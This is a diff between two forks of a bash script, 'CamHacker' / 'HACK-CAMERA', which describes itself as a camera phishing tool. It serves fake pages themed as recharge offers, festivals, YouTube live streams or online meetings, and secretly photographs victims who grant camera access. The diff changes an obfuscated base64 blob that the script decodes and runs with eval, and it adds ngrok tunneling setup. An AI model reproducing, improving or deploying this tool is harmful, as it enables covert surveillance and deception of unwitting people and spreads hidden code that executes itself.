@@ -1,14 +1,15 @@
 #!/bin/bash
 
-# HACK-CAMERA 
-# Version    : 1.5
-# Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : XPHANTOM (PH4N70M)
-# Github     : https://github.com/XPH4N70M
-# Join Us    : https://bit.ly/3LAy80f
-# Date       : 29-05-2022
+# CamHacker
+# Version    : 1.3
+# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : KasRoudra
+# Github     : https://github.com/KasRoudra
+# Email      : kasroudrakrd@gmail.com
+# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
+# Date       : 5-09-2021
 # License    : MIT
-# Copyright  : X PHANTOM X PH4N70M (2022-2023)
+# Copyright  : KasRoudra (2021-2022)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -16,7 +17,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 PH4N70M (X PHANTOM)
+Copyright (c) 2022 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -52,26 +53,27 @@ white="\033[0;37m"
 nc="\033[00m"
 
 # Output snippets
-info="${red}[${white}+${red}] ${cyan}"
+info="${cyan}[${white}+${cyan}] ${yellow}"
 info2="${blue}[${white}•${blue}] ${yellow}"
-ask="${red}[${white}?${red}] ${purple}"
+ask="${green}[${white}?${green}] ${purple}"
 error="${yellow}[${white}!${yellow}] ${red}"
-success="${red}[${white}√${red}] ${green}"
+success="${cyan}[${white}√${cyan}] ${green}"
 
 
 
-version="1.5"
+version="1.3"
 
 cwd=`pwd`
 
 # Logo
 logo="
-${green} _  _   _   ___ _  __    ___   _   __  __ ___ ___    _
-${cyan} | || | /_\ / __| |/ /__ / __| /_\ |  \/  | __| _ \  /_\
-${red} | __ |/ _ \ (__| ' <___| (__ / _ \| |\/| | _||   / / _ \
-${purple} |_||_/_/ \_\___|_|\_\   \___/_/ \_\_|  |_|___|_|_\/_/ \_\                
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
+${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}       [By XPHANTOM (PH4N70M),KasRoudra]
+${blue}                                    [By KasRoudra]
 "
 
 # Package Installer
@@ -85,6 +87,9 @@ pacin(){
 killer() {
 if [ `pidof php > /dev/null 2>&1` ]; then
     killall php
+fi
+if [ `pidof ngrok > /dev/null 2>&1` ]; then
+    killall ngrok
 fi
 if [ `pidof cloudflared > /dev/null 2>&1` ]; then
     killall cloudflared
@@ -167,7 +172,7 @@ trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
 
 echo -e "\n${info}Please Wait!...\n"
 
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogIXFlckIzYIRCekEHMORiIgwWY2VmCpICcahHJVRCTkcVUyRie5YFJ3RiZkAnW4RidkIzYIRiYkcHJzRCZkcVUyRyYkcHJyMGSkICIsFmdlhCJ9gnCiISPwpFe7IyckVkI9gHV7ICfgYnI9I2OiUmI9c3OiImI9Y3OiISPxBjT7IiZlJSPjp0OiQWLgISPVtjImlmI9MGOQtjI2ISP6ljV7Iybi0DZ7ISZhJSPmV0Y7IychBnI9U0YrtjIzFmI9Y2OiISPyMGS7Iyci0jS4h0OiIHI8ByJaBzZwA1UKZkWDl0NhBDM3B1UKRTVz8WaPJTT5kUbO9WSqRXTQNVSwkka0lXVWNWOJlWS3o1aVhHUTp0cVNVS3MmewkWSDRGTiFjRhRGVsh0VrRnUixGc3FGRKpmWwYERTdFZ2RWMs9GVshWYaBjREN1VkZHZwgzMSVlUK10R4hkWXh3QlVVOw1kRatGZUZUNWJzY3ZVbSBzYwolSaZkSzZlVCNkUrx2MNhFbYpleCNnVVpFNWZlSQ5kVWdlVVpERahkU6J1astmTUJUVTxmSHZlVCNUZXpEMjBjWKp1RohFVHp0QRJjR24UVOhWYrpERZhFcHJmVs5mYxIVYitWW5lVMatUUww2cNVlTKRWbnl3VXh3QVBDd4FVVOpkWwYERTdFZCFFMsx0YzAHUkBjREpFSC92VGBnbjJDcKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKNlM0R1VqZ0STdkUuJGMSt2YxoVWXdVMXJVMKZXUW5UYNVkWIdlbkd1UFxWNPdVMhp1MNl3VXh3bNxmRuFVVOpkWwYERThlQWJWbKBjWw4kSiZkSZd1V0N0VHJFMPdUMpRGRCR0UY5kcVJjUwoVMOFWTFpFSX5GZXdVR4BTUV5kSTFjRYdlaKdUTt5kbWdVMap1MkhUWuJ0aTVEb2YlaKFWYEZEWZdFZWJ2VONXYEp0aaJDd1l1MaNVTxw2cTxGaoJVVKR0UWB3SNZlUWRFbWNVVygnRV1GZyJWbOJTVq5kWiVEcZl1VzhXVwgnbkFjTYVlesZkVrJ1VhFjVLV1aWpUY6ZERTdFZ2plMONXZGRWYkRlVYpFRCNUVxAndVtGaKJGVsh0UXdHeWFDbQF1aOpkWwYERTZlTXJlVSdkTXRXVWxmSHNFWsdlUyo0cOdVMp1kVKlFVIJlQRBDeUZ1aWVlUqZlcWZkWTJ1ardXTV5kSaJTOullM4FmYt50cUtmWKVWbSBXWygHMNxGbvFmRWlWYFVjRTdFM1IFMrd3Uq5UaVVlSEN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkVV9GeWZkRDFlMSVzTVRmakRkQENFWOJlYGZVURtmWKRmeGR0UXRmdVZ1b3J1aklGZ6ZEWXpmQDVVMwZXVrhmSiRFbINFVSdlUxAXMiVkVKpFMGR0UXRmQRBDbuFVVOpkW6F1dWVEcTJFbWFVUtxWak1GeIpFSjVjVwgHMRVlTNRlesZVVxY1QNZlUu9kRk1kWwYEcRpnQzJlMWNXUr5UYkVlWIN1V4tmVxwmNUxGahRWRKRUWz40VSJjRuRlVohmYxoUSTRVT1IlMGVVUr5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUVhWaidEaYRFSSJUUwgndNVlTKplM5I0UXRmdl1mTx8kVkhWTFlkeWVEd2VlVnhnTWRWTZtmSUdFRFhXZWRmbNVkWXVlesZkVXRmQXVEepFFbOlVVxolRWVUWxEWMSdVVrplSNRkR1YlMjdnYGJVUiVkVXVFVsZ0UYlFelZFZu1URahGZI50RTdVOPJ2a4ZHVrRmSiBTNZd1VsNUYVlzcaZEZaVGbaN3UXRmVWBDeu9URkhWYspFSThlQCN1RKNXYGRWTkhEZJlFWSJUUwwmbRVlTKpFMGR0UVRneltWOzR1aolWYGBHWVVkWTZFbGZUUsp1VaJDdUdlaCdkUxA3MWxGaNRmaWhFVIJ1MXdkUx0UVOpkWwYERTdFZCFFMs5mYzQGUOFjVYpFSsN1VGJ0RVxmWSJVVKdlVtRmcVFzb3J1akFGZxoVWUhkUzc1RSBTUV5kSaBjREN1VkJUUwwGTjNDcQ1kRwhVWXlzTTV0azM1Vs5UYwwGVVZEcL1kVSZFVsZ1UVJDeGVVbkJXVyYVNPVFZrFGbaRXWzI0UWBDewQGMoFGZFZERTdFZCFFMs5WUV5kSTNjT2QleCFmVyYkdUtGaK5EMsBHVXRnSVFjQUZ1aWVlUqZlcWZkWTJ1asd3UWhWYjFjW0llbWd1UHJFMNVkTt1ERGR0UXRmQRBDbuFVVOpkWykjQTdFZCFFMs5WUV5kSaNjT2QleCFmVyYkdUtGaK5EMsBHVXRnSVFjQWNlaGVVVVpEVTpnQL1kMKNTTW5UTPVkSZR1RkJUUwwmbRVlTKpFMGBXU6RmeSdkU0JWRkhWZrpUNUJDbKJVRwBXTHBXVVdEeGZFbFVjUVx2dORkSpNmRKlUWzkFeVBzd08kVk1kWwYERTdFZCFFMs5WUXxGRkdFeINFWoJVUww2cUxGaaF2aKR0UXRmQhVlTyU1akpkT6J0VXdEZCJVRrdnWGRWTaBDb1M1V0pUUwwWakVkWKJGSohVWXlzaitmTzZVb1oWTEZUVVxmVHJlVKJlVthHRiZkW1lleBhnVGRGVPVlVXJlRaJnVVB3UhBjTwVlVkFWZVpFSZ1WMTZlMSJTZEpkWhRlQxZVVaRjVWpEUOZlVXZFWCJEVUJlQSVEO1U1V4ZVVFp0cRJDeXJWbNdXTXBXVVdEeGZFbFVTYw40dX1WMEVWRGRkWIJ0bXZEcuFVVOp0UwwGVThFbXJlMOJTZGRWYNxmWIdVbkZkUwsGePZFZspVMVlXWXdGeSBza3p1RslWZslVeZ1GdDV2VKV3TVRWaaBjVIN1V0EjVyYUcStGZpRWMaRnVXN2di1mTyMVb1omYIJVST1GbCVVMwBTUYxWaiBTNYdVbkJUUwwGTOZEZhJWMKl0UUN2dWxGauN1Vs5EZtFVeZ5mTTFWVs5WTGJlSaBDb1kVb0UjUyokcTVlTKllbSd0UXFzciVlTwJWMGlVYFBXSXpWR1ImVWZjUqpEVaJDd1V1VKNUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXN2dXZ0b4V2RxolTxoEcRJTU4JWbKJjYEpkalZlW0pFRkNVYXJVaRtmTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMrVTVsRWYlhlUJN1a0NTTxcGNPRlRZplbnh3VH5ENNFzZ08EVGllWuh2Ra1mW0UmVo1WZFpVba5GaJNFVnVjUtpVblVEaK9ERsdkWtR2MNFzZ08UVa1kWqx2RXdUW10kVo1WZFplSPdVU6llbORjVx8WMkVEaLN1Mkl0UYlFNNZFauFVVOFlWwYERTR1Z10kVoZXUV5UbaNzY6d1R5IUUyolbRhFbZpFMGRkWtR2MTV0a0E1aO1mWzQWSTRFaDFlMa1WYF5kSPR0a4dFRoNUUykVNWtGZpRGMwllWIRGMTVEcMRmeOllWtJFRTdlTDVmVo52TF5kSk5GZJNFVnVTTWhmbPVkTtplMOVzVHNGNRJjWuRmeOl1TFpERa1mTDVmVo5WWw4kSa1mUENFVoNUZVBXbR5GbNpFMGR0UUh2QRJTW14kVkplTVRTeadFd2RWMo1WUuxWWap3Z4d1RZVTTWhmbkBDaK9ERrh3VHp1QRBDbtFlbsllWrpERa1GZzMVRrRTUr5Ubap3Z4d1RaNUZWhWbR5GbZpleod0UXlVNS1mWt9EVGllW6hGRTRFbTZVMwVDZFh2STpHaHN1VkJUUwwmbRVlTKpFMGR0UXRmQlZFauFVVOpkWrpERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRhFbZplarh3VHRmQVJjWxYFbkFWZXFVeadFd2pFMrVzUYBXaipGbIlVajdmZDJUeJpGdJVWRvlTSu1UaPBDaq1kawkWSqRXbQNlSoNWeJdTYy4kRQNlS3lFWNl2Ty4kRapGMpl1VVl2TyEVOJ1GOp9UMZVTZqBTaOlWS3UFRopGUTpEcalWS3YFVwkWSDFzaJpGdLllewkmWXlVaPBDN3NGVwkWSqRnMQNlSplka0NDUTpEbJpGdpB1UKJTSIdXaPFjU0A1UKZkWI1UaPNDahNGRwkWSnBHNQNVUvpFWahmYDFUaKVEaq1UaSNjSH10ajxmRYp0RRt2Y5J1MKdUSrN1RNlnSIl1alZEc3p0RZtGZ5J1VPh1brNGbGhlSFd3aWNlU0clbBl2SRBHbk1mRzl0QJtGVqJEeKh0ZrN1RNlnSIpkUWlXSLdCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 
@@ -176,7 +181,7 @@ eval "$N0q$x$Hc2$rQW"
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
-    termux-fix-shebang hack_camera.sh
+    termux-fix-shebang ch.sh
     termux=true
 else
     termux=false
@@ -421,14 +426,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/changelog.log`
+    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -436,8 +441,8 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf HACK-CAMERA hack_camera && git clone https://github.com/XPH4N70M/HACK-CAMERA 
-            echo -e "\n${success}HACK-CAMERA updated successfully!!"
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
+            echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
             fi
@@ -451,6 +456,19 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         fi
 fi
 
+# Ngrok Authtoken
+if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
+    echo -e "\n${ask}Enter your ngrok authtoken:"
+    printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+    read auth
+    if [ -z $auth ]; then
+        echo -e "\n${error}No authtoken!\n\007"
+        sleep 1
+    else
+        cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
+    fi
+fi
+
 # Start Point
 while true; do
 clear
@@ -458,23 +476,23 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${red}[${white}1${red}] ${cyan}Jio Recharge
-${red}[${white}2${red}] ${cyan}Festival
-${red}[${white}3${red}] ${cyan}Live Youtube
-${red}[${white}4${red}] ${cyan}Online Meeting
-${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
-${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
-${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
-${red}[${white}x${red}] ${cyan}About
-${red}[${white}m${red}] ${cyan}More tools
-${red}[${white}0${red}] ${cyan}Exit${blue}
+${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
+${cyan}[${white}2${cyan}] ${yellow}Festival
+${cyan}[${white}3${cyan}] ${yellow}Live Youtube
+${cyan}[${white}4${cyan}] ${yellow}Online Meeting
+${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
+${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
 "
 sleep 1
 if [ -z $OPTION ]; then
     exit 1
 else
     if [[ $OPTION == true ]]; then
-        printf "${cyan}\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read option
     else
         option=$OPTION
@@ -486,7 +504,7 @@ fi
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -497,7 +515,7 @@ fi
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\NXPHANTOM ${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -517,7 +535,7 @@ fi
         echo -e "${success}Tunneler switched to ${TN} successfully!\n"
         sleep 2
     elif echo $option | grep -q "p"; then
-        printf "\n${ask}Enter Port:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read pore
         if [ ! -z "${pore##*[!0-9]*}" ] ; then
             PORT=$pore;
@@ -528,7 +546,7 @@ fi
             sleep 2
         fi
     elif echo $option | grep -q "d"; then
-        printf "\n${ask}Enter Directory:${cyan}\549XPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -544,9 +562,10 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/XPH4N70M]
-$red[Join Us]  ${cyan} :[https://bit.ly/3LAy80f]
+$red[Author]     ${cyan} :[KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
+$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
+$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read about
     elif echo $option | grep -q "m"; then
